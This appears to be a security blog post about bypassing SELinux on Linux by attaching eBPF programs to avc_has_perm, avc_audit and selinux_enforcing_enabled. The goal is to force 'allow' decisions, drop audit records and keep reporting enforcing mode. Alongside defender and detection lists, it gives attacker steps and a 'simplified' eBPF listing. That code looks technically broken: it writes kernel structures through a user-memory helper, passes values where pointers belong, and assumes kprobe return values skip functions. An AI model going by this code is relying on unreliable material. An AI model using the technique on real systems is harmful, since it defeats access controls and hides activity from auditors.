Silencing SELinux: Bypassing Mandatory Access Controls

Wut

Poisoning the AVC cache and dropping audit logs so SELinux reports Enforcing yet allows every forbidden read and exec. This technique enables attackers to bypass one of Linux’s strongest security mechanisms while maintaining the appearance that it’s fully operational.

Why

Because eBPF + misconfiguration => broken isolation. SELinux provides mandatory access controls that restrict what resources processes can access, regardless of traditional Unix permissions. By manipulating the Access Vector Cache (AVC) and dropping audit logs, attackers can bypass these controls while the system still reports that SELinux is enforcing—creating a dangerous false sense of security.

Attacker hat on

  1. Identify a target system with eBPF capabilities and SELinux in enforcing mode
  2. Map the kernel functions responsible for SELinux enforcement and auditing
  3. Develop eBPF programs that hook into these functions
  4. Load the malicious BPF programs with appropriate privileges
  5. Poison the AVC cache to allow otherwise forbidden operations
  6. Drop audit events that would reveal the policy violations
  7. Execute operations that should be blocked by SELinux
  8. Verify that monitoring systems still show SELinux as enforcing

Defender hat on

  1. Remove CAP_BPF from untrusted processes and containers
  2. Implement BPF LSM policies to restrict eBPF program loading
  3. Use multiple, independent security monitoring mechanisms
  4. Implement integrity verification for SELinux subsystems
  5. Monitor for unexpected eBPF programs attached to security functions
  6. Consider using eBPF-based security tools that can detect malicious eBPF usage

Conclusion

eBPF is all you need. The ability to intercept and modify SELinux decisions through eBPF creates a particularly dangerous scenario where one of the strongest Linux security mechanisms can be completely bypassed while appearing fully functional. This technique highlights why eBPF capabilities should be treated as highly privileged operations that require strict access controls.

Technical Details

SELinux Architecture

SELinux provides mandatory access controls through:

  • Policy: Rules defining what subjects (processes) can access which objects (files, sockets, etc.)
  • Labels: Security contexts assigned to all subjects and objects
  • Enforcement: Kernel mechanisms that check access against policy
  • AVC: Access Vector Cache that stores previous access decisions for performance
  • Auditing: Logging of policy violations and enforcement actions

When a process attempts to access a resource, SELinux checks if the operation is allowed based on the security contexts and policy rules.

Exploitation Technique

The exploit leverages eBPF’s ability to attach to kernel functions that implement SELinux checks. By intercepting these calls, an attacker can:

  1. Hook decision functions: Attach to functions like avc_has_perm() or security_compute_av()
  2. Poison the AVC: Inject false “allow” decisions into the cache
  3. Intercept audit events: Prevent logging of policy violations
  4. Maintain appearances: Ensure the system still reports SELinux as enforcing

// Simplified eBPF program to bypass SELinux
SEC("kprobe/avc_has_perm")
int BPF_KPROBE(hook_avc_check, const struct security_id *ssid,
               const struct security_id *tsid, u16 tclass,
               u32 requested, struct av_decision *avd)
{
    // Get process information
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    
    // Check if this is our target process
    if (is_target_process(pid)) {
        // Modify the decision to allow access
        // Set all requested permissions as allowed
        bpf_probe_write_user(&avd->allowed, requested, sizeof(u32));
        
        // Clear any denied permissions
        u32 zero = 0;
        bpf_probe_write_user(&avd->denied, zero, sizeof(u32));
        
        // Mark as a cache hit to prevent further checks
        u8 one = 1;
        bpf_probe_write_user(&avd->flags, AVC_CACHED, sizeof(u8));
    }
    
    return 0;
}

// Hook the audit logging function to drop evidence
SEC("kprobe/avc_audit")
int BPF_KPROBE(hook_avc_audit, const struct security_id *ssid,
               const struct security_id *tsid, u16 tclass,
               u32 requested, struct av_decision *avd,
               int result, struct common_audit_data *a)
{
    // Get process information
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    
    // Check if this is our target process
    if (is_target_process(pid)) {
        // Skip the audit by returning early
        // This prevents the audit record from being generated
        return 1;
    }
    
    // Let the original function run for other processes
    return 0;
}

// Ensure SELinux still appears to be enforcing
SEC("kprobe/selinux_enforcing_enabled")
int BPF_KPROBE(hook_selinux_status)
{
    // Always return 1 (enforcing) to maintain appearances
    return 1;
}

Detection Methods

Defenders should monitor for:

  • Unexpected eBPF programs attached to SELinux-related functions
  • Discrepancies between expected SELinux behavior and actual system behavior
  • Successful access to resources that should be blocked by policy
  • Missing audit records for security-relevant operations
  • Inconsistencies between different security monitoring systems

This technique demonstrates why proper eBPF restrictions are critical for maintaining the integrity of security controls, especially in environments where SELinux is a key security mechanism.

Real-world Impact

In environments that rely on SELinux for security, this technique could allow an attacker to:

  • Access sensitive files that should be protected
  • Execute binaries that should be blocked
  • Establish network connections that violate policy
  • Bypass container isolation enforced by SELinux
  • Maintain persistence despite security controls

The ability to silently bypass SELinux while maintaining the appearance that it’s enforcing creates a particularly dangerous scenario where security teams believe they’re protected when they’re actually vulnerable.
